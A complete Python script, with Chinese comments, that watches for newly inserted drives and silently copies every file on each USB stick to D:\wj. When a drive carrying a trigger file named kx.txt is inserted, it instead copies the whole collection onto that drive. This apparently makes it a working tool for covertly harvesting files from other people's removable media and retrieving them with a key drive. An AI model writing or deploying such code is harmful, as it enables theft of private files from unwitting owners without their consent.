import psutil
import shutil
import os
import time
from datetime import datetime


def copy_all_contents(source_folder, destination_folder):
    # 遍历源文件夹中的所有文件和目录，并拷贝到目标文件夹
    for root, dirs, files in os.walk(source_folder):
        for file in files:
            source_path = os.path.join(root, file)
            destination_path = os.path.join(destination_folder, os.path.relpath(source_path, source_folder))

            # 确保目标目录存在
            os.makedirs(os.path.dirname(destination_path), exist_ok=True)

            shutil.copy2(source_path, destination_path)
            print(f"拷贝文件：{source_path} 到 {destination_path}")


def copy_usb_contents(usb_drive, destination_folder):
    # 获取U盘根目录
    usb_root = os.path.join(usb_drive, "")

    # 检查目标文件夹是否存在，如果不存在则创建
    if not os.path.exists(destination_folder):
        os.makedirs(destination_folder)

    # 创建一个唯一的目录名，使用当前日期和时间
    current_datetime = datetime.now().strftime("%Y%m%d_%H%M%S")
    unique_destination_folder = os.path.join(destination_folder, f"U盘_{current_datetime}")

    # 遍历U盘中的所有文件和目录，并拷贝到目标文件夹
    for root, dirs, files in os.walk(usb_root):
        for subdir in dirs:
            source_path = os.path.join(root, subdir)
            destination_path = os.path.join(unique_destination_folder, os.path.relpath(source_path, usb_root))

            # 确保目标目录存在
            os.makedirs(destination_path, exist_ok=True)

        for file in files:
            source_path = os.path.join(root, file)
            destination_path = os.path.join(unique_destination_folder, os.path.relpath(source_path, usb_root))

            # 确保目标目录存在
            os.makedirs(os.path.dirname(destination_path), exist_ok=True)

            shutil.copy2(source_path, destination_path)
            print(f"拷贝文件：{source_path} 到 {destination_path}")


def check_and_copy_usb():
    existing_drives = set(psutil.disk_partitions())

    while True:
        time.sleep(2)
        current_drives = set(psutil.disk_partitions())

        # 检测新插入的磁盘驱动器
        new_drives = current_drives - existing_drives
        if new_drives:
            for drive in new_drives:
                print("U盘已插入！")
                print("新的磁盘驱动器：", drive)

                # 检查U盘内容，并拷贝到目标文件夹
                destination_folder = r"D:\wj"
                usb_drive = drive.device

                # 检查是否存在kx.txt文件，如果存在则创建新文件夹K，并跳过拷贝U盘内容
                kx_file_path = os.path.join(usb_drive, "kx.txt")
                if os.path.exists(kx_file_path):
                    print("U盘中存在kx.txt文件，跳过拷贝U盘内容")
                    k_destination_folder = os.path.join(usb_drive, "K")
                    copy_all_contents(r"D:\wj", k_destination_folder)
                else:
                    copy_usb_contents(usb_drive, destination_folder)

        # 检测拔出的磁盘驱动器
        removed_drives = existing_drives - current_drives
        if removed_drives:
            for drive in removed_drives:
                print("U盘已拔出！")
                print("拔出的磁盘驱动器：", drive)

        # 更新已知的磁盘驱动器集合
        existing_drives = current_drives


# 运行检测U盘插入和拔出，并拷贝文件的函数
check_and_copy_usb()
